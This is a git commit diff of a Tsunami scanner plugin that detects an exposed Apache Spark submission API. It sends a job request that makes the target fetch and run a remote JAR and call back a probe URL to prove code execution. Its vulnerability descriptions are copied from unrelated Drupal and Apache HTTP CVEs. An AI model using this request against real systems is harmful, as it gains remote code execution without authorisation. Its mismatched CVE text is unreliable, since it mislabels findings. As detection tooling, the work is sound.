a57eeb6f1c271ef24d968ee98865a7b836c2572c
Timo Mueller <mueller@mogwailabs.de>
2024-04-01 23:14:02 +0200

    mostly working version

--- community/detectors/rce/apache_spark_exposed_api/src/main/java/com/google/tsunami/plugins/detectors/rce/cve202125646/ApacheSparksExposedApiVulnDetector.java
+++ community/detectors/rce/apache_spark_exposed_api/src/main/java/com/google/tsunami/plugins/detectors/rce/cve202125646/ApacheSparksExposedApiVulnDetector.java
@@ -36,177 +36,106 @@ import javax.inject.Inject;
 import static com.google.tsunami.common.net.http.HttpRequest.post;
 import com.google.tsunami.common.net.http.HttpHeaders;
 import com.google.protobuf.ByteString;
+import com.google.tsunami.proto.PayloadGeneratorConfig;
+import com.google.tsunami.plugin.payload.Payload;
+import com.google.tsunami.plugin.payload.PayloadGenerator;
+import static java.nio.charset.StandardCharsets.UTF_8;
+import java.lang.Thread;
 
-/** A {@link VulnDetector} that detects the TODO CVE-2021-41773 and CVE-2021-42013 vulnerability. */
-@PluginInfo(
-    type = PluginType.VULN_DETECTION,
-    name = "ApacheSparksExposedApiVulnDetector",
-    version = "1.0",
-    description =
-        "This detector checks for Apache HTTP Server 2.4.49 Path traversal and "
-            + "disclosure vulnerability.",
-    author = "threedr3am (qiaoer1320@gmail.com)",
-    bootstrapModule = ApacheSparksExposedApiVulnDetectorBootstrapModule.class)
-public class ApacheSparksExposedApiVulnDetector implements VulnDetector {
+/** A Tsunami plugin for detecting CVE-2019-6340. */
+@PluginInfo(type = PluginType.VULN_DETECTION, name = "DrupalApacheSparksExposedApiVulnDetector", version = "0.1", description = "This plugin detects a Drupal remote code execution (RCE)"
+		+ " vulnerability via Unsafe Deserialization in REST API", author = "Tsunami Team (tsunami-dev@google.com)", bootstrapModule = ApacheSparksExposedApiVulnDetectorBootstrapModule.class)
+public final class ApacheSparksExposedApiVulnDetector implements VulnDetector {
 
-  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
+	private final Clock utcClock;
+	private final HttpClient httpClient;
+	private final PayloadGenerator payloadGenerator;
+		private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
 
-  private final Clock utcClock;
-  private final HttpClient httpClient;
+	private static final Pattern VULNERABILITY_RESPONSE_PATTERN = Pattern.compile("Driver successfully submitted");
+	private static String httpPayloadBodyFormatString = "{\"action\":\"CreateSubmissionRequest\",\"clientSparkVersion\":\"1\",\"appArgs\":[\"%s\"],\"appResource\":\"%s\",\"environmentVariables\":{\"SPARK_ENV_LOADED\":\"1\"},\"mainClass\":\"Tsunami\",\"sparkProperties\":{\"spark.jars\":\"%s\",\"spark.driver.supervise\":\"false\",\"spark.app.name\":\"Tsunami\",\"spark.eventLog.enabled\":\"true\",\"spark.submit.deployMode\":\"cluster\",\"spark.master\":\"spark://localhost:6066\"}}";
+	private static final String JAR_PAYLOAD_URI = "https://github.com/timoles/tsunami-security-scanner-plugins/raw/exposed_spark_ui_and_api/payloads/community/apache_spark_exposed_api/Tsunami_Apache_Spark_Exploit.jar"; // TODO
+																																																							// change
+																																																							// github
+													
+	private static String interactionUriFormatString = "http://%s";
 
-  private static final Pattern VULNERABILITY_RESPONSE_PATTERN = Pattern.compile("Driver successfully submitted");
-  private static String payload = "{\"action\":\"CreateSubmissionRequest\",\"clientSparkVersion\":\"1\",\"appArgs\":[\"%s\"],\"appResource\":\"%s\",\"environmentVariables\":{\"SPARK_ENV_LOADED\":\"1\"},\"mainClass\":\"Tsunami\",\"sparkProperties\":{\"spark.jars\":\"%s\",\"spark.driver.supervise\":\"false\",\"spark.app.name\":\"Tsunami\",\"spark.eventLog.enabled\":\"true\",\"spark.submit.deployMode\":\"cluster\",\"spark.master\":\"spark://localhost:6066\"}}";
-private static final String JAR_PAYLOAD_URI = "https://github.com/timoles/tsunami-security-scanner-plugins/raw/exposed_spark_ui_and_api/payloads/community/apache_spark_exposed_api/Tsunami_Apache_Spark_Exploit.jar"; // TODO change github link
-  @Inject
-  ApacheSparksExposedApiVulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
-    this.utcClock = checkNotNull(utcClock);
-    this.httpClient = checkNotNull(httpClient);
-  }
+	@Inject
+	ApacheSparksExposedApiVulnDetector(@UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
+		this.utcClock = checkNotNull(utcClock);
+		this.httpClient = checkNotNull(httpClient);
+		this.payloadGenerator = checkNotNull(payloadGenerator);
+	}
 
-  @Override
-  public DetectionReportList detect(
-      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
-    return DetectionReportList.newBuilder()
-        .addAllDetectionReports(
-            matchedServices.stream()
-                .filter(NetworkServiceUtils::isWebService)
-                .map(this::checkService)
-                .filter(CheckResult::isVulnerable)
-                .map(checkResult -> buildDetectionReport(targetInfo, checkResult))
-                .collect(toImmutableList()))
-        .build();
-  }
+	@Override
+	public DetectionReportList detect(TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
+		logger.atInfo().log("ApacheSparksExposedApiVulnDetector starts detecting.");
 
-  private CheckResult checkService(NetworkService networkService) {
-    //for (String dir : COMMON_DIRECTORIES) {
-      //for (String payload : COMMON_PAYLOADS) {
-        CheckResult checkResult = checkUrlWithCommonDirectory(networkService);
-        if (checkResult.isVulnerable()) {
-          return checkResult;
-      //  }
-      //}
-    }
-    return CheckResult.buildForSecureService(networkService);
-  }
+		return DetectionReportList.newBuilder().addAllDetectionReports(matchedServices.stream()
+				.filter(NetworkServiceUtils::isWebService).filter(this::isServiceVulnerable)
+				.map(networkService -> buildDetectionReport(targetInfo, networkService)).collect(toImmutableList()))
+				.build();
+	}
 
-  private CheckResult checkUrlWithCommonDirectory(
-      NetworkService networkService) {
-    String targetUri =
-            NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "v1/submissions/create";
-    try {
-    	String finished_payload = String.format(payload, "https://kl9q5t25f7tf0kfqmdhgx9k9l0rvfl3a.cb.mogwailabs.de/aa", JAR_PAYLOAD_URI, JAR_PAYLOAD_URI); // TODO
-    	HttpResponse response =
-    	          httpClient.send(
-    	              post(targetUri)
-    	                  .setHeaders(
-    	                      HttpHeaders.builder()
-    	                          .addHeader("Content-Type",
-    	                              "application/json")
-    	                          .addHeader("User-Agent", "TSUNAMI_SCANNER")
-    	                          .build())
-    	                  .setRequestBody(ByteString.copyFrom(finished_payload, "utf-8"))
-    	                  .build(),
-    	              networkService);
-    	
-    	
-    	
-      //HttpResponse response = httpClient.sendAsIs(get(targetUri).withEmptyHeaders().build());
-      Optional<String> body = response.bodyString();
-      if (response.status() == HttpStatus.OK // TODO !!
-          && body.isPresent()
-          && VULNERABILITY_RESPONSE_PATTERN.matcher(body.get()).find()) {
-        logger.atInfo().log("Received vulnerable response from target %s.", targetUri);
-        return CheckResult.buildForVulnerableDetection(networkService, targetUri, response);
-      }
-    } catch (IOException e) {
-      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
-    }
-    return CheckResult.buildForSecureService(networkService);
-  }
+	private boolean isServiceVulnerable(NetworkService networkService) {
+	//	String baseUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
+		//logger.atInfo().log("Trying to execute code at '%s'", baseUri);
+		return exploitUri(networkService);
+	}
 
-  private DetectionReport buildDetectionReport(TargetInfo targetInfo, CheckResult checkResult) {
-    NetworkService vulnerableNetworkService = checkResult.networkService();
-    return DetectionReport.newBuilder()
-        .setTargetInfo(targetInfo)
-        .setNetworkService(vulnerableNetworkService)
-        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
-        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
-        .setVulnerability(
-            Vulnerability.newBuilder()
-                .setMainId(
-                    VulnerabilityId.newBuilder()
-                        .setPublisher("TSUNAMI_COMMUNITY")
-                        .setValue("CVE_2021_41773"))
-                .setSeverity(Severity.HIGH)
-                .setTitle("Apache HTTP Server 2.4.49 Path traversal and disclosure vulnerability")
-                .setDescription(
-                    "A flaw was found in a change made to path normalization in Apache HTTP Server "
-                        + "2.4.49. An attacker could use a path traversal attack to map URLs to "
-                        + "files outside the expected document root. "
-                        + "If files outside of the document root "
-                        + "are not protected by \"require all denied\" these requests can succeed. "
-                        + "Additionally this flaw could leak the source of interpreted files "
-                        + "like CGI scripts. "
-                        + "This issue is known to be exploited in the wild. "
-                        + "This issue affects Apache 2.4.49 and 2.4.50 but not earlier versions. "
-                        + "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773 "
-                        + "https://httpd.apache.org/security/vulnerabilities_24.html")
-                .setRecommendation("Update to 2.4.51 release.")
-                .addAdditionalDetails(buildAdditionalDetail(checkResult)))
-        .build();
-  }
+	private boolean exploitUri(NetworkService networkService) {
+		String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "v1/submissions/create";
 
-  private AdditionalDetail buildAdditionalDetail(CheckResult checkResult) {
-    checkState(checkResult.isVulnerable());
-    checkState(checkResult.vulnerableUrl().isPresent());
-    checkState(checkResult.response().isPresent());
-    HttpResponse response = checkResult.response().get();
-    StringBuilder reportBuilder = new StringBuilder();
-    reportBuilder
-        .append("Vulnerable target:\n")
-        .append(checkResult.vulnerableUrl().get())
-        .append("\n\nResponse:\n")
-        .append(response.status().code())
-        .append(' ')
-        .append(response.status())
-        .append('\n');
-    response
-        .headers()
-        .names()
-        .forEach(
-            headerName ->
-                response
-                    .headers()
-                    .getAll(headerName)
-                    .forEach(
-                        headerValue ->
-                            reportBuilder
-                                .append(headerName)
-                                .append(": ")
-                                .append(headerValue)
-                                .append('\n')));
-    response.bodyString().ifPresent(body -> reportBuilder.append('\n').append(body));
-    return AdditionalDetail.newBuilder()
-        .setTextData(TextData.newBuilder().setText(reportBuilder.toString()))
-        .build();
-  }
+		PayloadGeneratorConfig config = PayloadGeneratorConfig.newBuilder()
+				.setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.SSRF)
+				.setInterpretationEnvironment(PayloadGeneratorConfig.InterpretationEnvironment.INTERPRETATION_ANY)
+				.setExecutionEnvironment(PayloadGeneratorConfig.ExecutionEnvironment.EXEC_ANY).build();
+		Payload payload = payloadGenerator.generate(config);
 
-  @AutoValue
-  abstract static class CheckResult {
-    abstract boolean isVulnerable();
-    abstract NetworkService networkService();
-    abstract Optional<String> vulnerableUrl();
-    abstract Optional<HttpResponse> response();
+		String interactionUri = String.format(interactionUriFormatString, payload.getPayload());
 
-    static CheckResult buildForVulnerableDetection(
-        NetworkService networkService, String url, HttpResponse response) {
-      return new AutoValue_ApacheSparksExposedApiVulnDetector_CheckResult(
-          true, networkService, Optional.of(url), Optional.of(response));
-    }
+		String finished_payload = String.format(httpPayloadBodyFormatString, interactionUri, JAR_PAYLOAD_URI,
+				JAR_PAYLOAD_URI); // TODO
 
-    static CheckResult buildForSecureService(NetworkService networkService) {
-      return new AutoValue_ApacheSparksExposedApiVulnDetector_CheckResult(
-          false, networkService, Optional.empty(), Optional.empty());
-    }
-  }
+		try {
+
+			HttpResponse response = httpClient.send(post(targetUri)
+					.setHeaders(HttpHeaders.builder().addHeader("Content-Type", "application/json")
+							.addHeader("User-Agent", "TSUNAMI_SCANNER").build())
+					.setRequestBody(ByteString.copyFrom(finished_payload, "utf-8")).build(), networkService);
+
+		} catch (IOException e) {
+			logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
+
+			
+		}
+		// TODO remove, only for testing
+		try {
+		Thread.sleep(1000);
+		}catch(Exception e) {}
+
+		return payload.checkIfExecuted();
+	}
+
+	private DetectionReport buildDetectionReport(TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
+
+		return DetectionReport.newBuilder().setTargetInfo(targetInfo).setNetworkService(vulnerableNetworkService)
+				.setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
+				.setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
+				.setVulnerability(Vulnerability.newBuilder()
+						.setMainId(VulnerabilityId.newBuilder().setPublisher("GOOGLE").setValue("CVE_2019_6340"))
+						.setSeverity(Severity.CRITICAL).setTitle("Drupal RCE CVE-2019-6340 Detected")
+						.setDescription("Some field types do not properly sanitize data from non-form sources in "
+								+ "Drupal 8.5.x before 8.5.11 and Drupal 8.6.x before 8.6.10. This can lead"
+								+ " to arbitrary PHP code execution in some cases. A site is only affected"
+								+ " by this if one of the following conditions is met: The site has the"
+								+ " Drupal 8 core RESTful Web Services (rest) module enabled and allows"
+								+ " PATCH or POST requests, or the site has another web services module"
+								+ " enabled, like JSON:API in Drupal 8, or Services or RESTful Web Services"
+								+ " in Drupal 7. (Note: The Drupal 7 Services module itself does not"
+								+ " require an update at this time, but you should apply other contributed"
+								+ " updates associated with this advisory if Services is in use.)")
+						.setRecommendation("Upgrade to Drupal 8.6.10 or Drupal 8.5.11 with security patches."))
+				.build();
+	}
 }
